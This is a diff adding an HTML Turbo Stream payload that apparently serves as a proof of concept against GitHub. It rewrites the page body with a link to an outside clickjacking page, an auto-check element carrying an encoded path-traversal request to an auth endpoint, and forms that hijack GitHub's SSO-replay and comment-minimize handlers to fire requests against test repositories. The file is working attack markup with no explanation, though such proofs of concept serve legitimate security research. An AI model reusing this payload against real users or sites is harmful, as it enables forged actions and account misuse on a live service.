@@ -1,0 +1,35 @@
+<turbo-stream action=update targets='body'><template>
+
+<a href='https://poc.j15.se/github/clicker_poc.html' target='_blank' rel='opener' class="dark-backdrop position-fixed">full page link</a>
+
+<div class="js-branch-protection-integration-select-item">
+
+<div class="js-branch-protection-integration-select-label">
+<auto-check dirty validate-on-keystroke=true src="/joaxcar-hack/victim/issues/..%2f..%2f..%2f..%5cauth%2fgithub_editor%3Fredirect=x" required="" http-method="GET">
+<div id=bbb><input  value=x href=#bbb type="checkbox" name="custom_scope_name" id="custom_scope_name" data-target="custom-scopes.customScopesNameField" class="form-control"></div>
+</auto-check>
+</div>
+
+<form data-turbo=false class="js-auto-replay-enforced-sso-request" action="https://github.com/orgs/joaxcar-hack-org1/projects/2#bbb" action="post"></form>
+
+<div class="js-branch-protection-integration-select">
+
+<div class="js-minimize-container">
+<form class="js-timeline-comment-minimize js-auto-replay-enforced-sso-request" action="/joaxcar-hack/victim/security/advisories/new#">
+</form>
+</div>
+
+<div class="js-minimize-container">
+<form class="js-timeline-comment-minimize" action="/joaxcar/x/commit/a7105.patch">
+<div id=aaa><button href=#aaa></button></div>
+</form>
+</div>
+
+<div>
+<div id=ccc><input href=#ccc type="checkbox" name="protection_rule" class="js-branch-protection-integration-select-input" id="opt1"><div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</template></turbo-stream>
